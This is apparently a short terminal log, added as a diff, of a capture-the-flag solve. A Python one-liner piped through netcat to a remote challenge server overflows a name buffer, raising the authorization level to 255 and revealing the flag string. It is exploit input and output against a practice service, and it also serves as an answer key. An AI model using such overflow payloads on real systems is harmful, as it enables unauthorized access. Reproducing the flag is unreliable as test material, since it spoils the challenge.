@@ -1,0 +1,13 @@
+yutaro@S-Ubuntu:~$ (python -c "print '\x00'*32+'\xff'*2" ; cat) | nc 104.236.255.49 12341
+Welcome to remote file viewing, guest access mode.
+What is your name? Your authorization level is 255.
+0: exit
+1: Level 003: view "main.c"
+2: Level 126: view "flag.txt"
+2
+The flag is:
+~4da_win
+0: exit
+1: Level 003: view "main.c"
+2: Level 126: view "flag.txt"
+0
